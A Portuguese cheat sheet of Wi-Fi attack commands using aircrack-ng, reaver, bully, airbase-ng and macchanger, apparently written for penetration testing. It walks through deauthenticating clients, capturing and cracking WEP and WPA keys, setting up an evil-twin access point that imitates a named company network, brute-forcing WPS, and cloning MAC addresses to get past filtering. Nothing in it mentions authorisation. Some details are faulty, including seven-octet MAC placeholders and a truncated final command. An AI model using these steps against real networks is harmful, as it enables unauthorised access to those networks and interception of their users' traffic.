# AIRCRACK-NG SUITE

## AIRMON-NG

Checando processos conflitantes:

```bash
airmon-ng check
```

Matando processos conflitantes:

```bash
airmon-ng check kill
```

Iniciando modo monitor:

```bash
airmon-ng start wlan0
```

*O nome da interface pode variar.*

Setando canal específico:

```bash
iwconfig wlan0mon channel 1
```

## AIRODUMP-NG

Ver informações das redes wireless:

```bash
airodump-ng wlan0mon
```

Filtrando por canal:

```bash
airodump-ng -c 10 wlan0mon
```

Filtrando por BSSID:

```bash
airodump-ng --bssid 00:11:22:AA:BB:CC wlan0mon
```

Filtrando por tipo de criptografia:

```bash
airodump-ng --encrypt wep wlan0mon
```

Verificando redes com WPS:

```bash
airodump-ng wlan0mon --wps
```

```bash
wash -i wlan0mon -C
```

Capturando os pacotes e escrevendo em um arquivo:

```bash
airodump-ng -c 10 --bssid 00:11:22:AA:BB:CC -w capture wlan0mon
```

## AIREPLAY-NG

Para acelerar a captura de pacotes através do airodump-ng no ataque WEP:

```bash
aireplay-ng -3 -b 00:11:22:AA:BB:CC -h AA:BB:CC:DD:EE:FF:99 wlan0mon
```

**-b** ==> BSSID do roteador alvo.  
**-h** ==> BSSID do cliente conectado ao roteador.  

Para acelerar a captura de handshakes através do airodump-ng no ataque WPA:

```bash
aireplay-ng -0 5 -a 00:11:22:AA:BB:CC -c AA:BB:CC:DD:EE:FF:99 wlan0mon
```

**-a** ==> MAC access point.  
**-c** ==> MAC do cliente.  
**-0 5** ==> Deauth cliente 5 vezes.

## AIRCRACK-NG

Quebra do arquivo capturado no airodump-ng para redes WEP:

```bash
aircrack-ng capture-01.cap
```

Quebra do arquivo capturado no airodump-ng para redes WPA:

```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

Concatenar crunch e o aircrack-ng:

```bash
crunch 15 15 -t EmpresaAlfa%%%% 0123456789 | aircrack-ng captura-01.cap -w - -e EmpresaAlfa
```

## AIRDECAP-NG

Desencriptando pacotes escriptados em rede wireless:

```bash
airdecap-ng -w A0:11:22:33:44:55:66:77:CC:B1:B4:8A:D3 capture-01.cap
```

**-w** ==> Senha em HEX da rede.

## AIRBASE-NG

Criando AP Fake OPN:

```bash
airbase-ng wlan0mon -c 3 -e FreeWifi
```

Criando AP Fake WPA2:

```bash
airbase-ng wlan0mon -c 3 -e FreeWifi -Z 4
```

Configurando AP Fake para possuir acesso à internet:  
1- echo 1 > /proc/sys/net/ipv4/ip_forward  
2- iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
3- apt install isc-dhcp-server  
4- nano /etc/default/isc-dhcp-server

```bash
INTERFACES="at0"
```

5- nano /etc/dhcp/dhcpd.conf

```bash
option domain-name-servers 8.8.8.8, 8.8.4.4;  

default-lease-time 600;  
max-lease-time 7200;  

ddns-update-style none;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.10 10.0.0.100;
  option routers 10.0.0.1;
}
```

5- ifconfig at0 10.0.0.1/24  
6- service isc-dhcp-server start

## EVIL TWIN

Consiste em criar uma rede idêntica a do alvo.  

Criando rede através do airbase-ng:

```bash
airbase-ng wlan0mon -c 10 -e EmpresaAlfa -a 00:11:22:33:44:55 -Z 4
```

Agora iremos efetuar o Death dos clientes:

```bash
aireplay-ng wlan0mon -0 5 -a 00:11:22:33:44:55
```

*Logo os usuários irão se conectar no AP Fake.*

## BULLY

Brute force em WPS:

```bash
bully wlan0mon -b 00:11:22:AA:BB:CC -e EmpresaAlfa -c 10
```

## REAVER

Brute force em WPS:

```bash
reaver -i wlan0mon -b 00:11:22:AA:BB:CC -vv
```

Ataque PixieWPS:

```bash
reaver -i wlan0mon -b 00:11:22:AA:BB:CC -vv -K 1
```

```bash
reaver -i wlan0mon -b 00:11:22:AA:BB:CC -vv -K 1 -P
```

Utilizando timeout e delay:

```bash
reaver -i wlan0mon -b 00:11:22:AA:BB:CC -vv -t 2 -d 5
```

## MAC Changer

Clonando MAC de cliente para conectar em redes com MAC Filter:

```bash
ifconfig wlan0 down  
```

```bash
macchanger -m AA:BB:CC:DD:EE:FF:99 wlan0  
```

```bash
ifconfig wlan0 up  
```

```bash
service NetworkManager  
```
